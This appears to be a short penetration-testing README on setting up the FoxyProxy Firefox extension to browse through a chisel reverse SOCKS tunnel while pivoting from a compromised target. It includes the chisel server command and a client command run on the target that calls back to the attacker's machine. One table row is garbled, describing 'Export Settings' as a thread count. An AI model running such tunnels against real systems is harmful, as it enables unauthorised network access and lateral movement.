# FoxyProxy
How to use FoxyProxy while you are pivoting 



## Installation

Install Foxy proxy in firefox

    add this extention in [firefox] (https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)
    



## Tabs

| Flag | Description |
|-----|---|
| `-Add` | add Host or IP address to tunneling in your personal desktop use (default "127.0.0.1") |
| `-Import Settings` | import setting from another proxy recently made  |
| `-Export Settings` | Number of threads to be used (default 900)  |
| `-Delete Browser Data` | delete all the browse data used with the foxyproxy |


Before use it make sure you are using chisel 
example 

from our machine 
❯ ./chisel.sh server --reverse -p 1234
2023/04/22 12:43:06 server: Reverse tunnelling enabled
2023/04/22 12:43:06 server: Fingerprint UZR5whzX6TnMDlLINxvzdJdy3WBc3+XHoPbqGceyBNg=
2023/04/22 12:43:06 server: Listening on http://0.0.0.0:1234
2023/04/22 12:44:17 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

from the target machine
```
bash-5.0$ ./chisel.sh client 192.168.100.53:1234 R:socks
```

## Usage

use tab "add"  and for tabs

## ProxyType
in our case will be SOCKS5, because we are in a tunnel made by chisel server
## Proxy IP address or DNS name

## Port
in our case will be 1080

## Username (Optional)
(Optional)

## password (Optional)
(Optional)
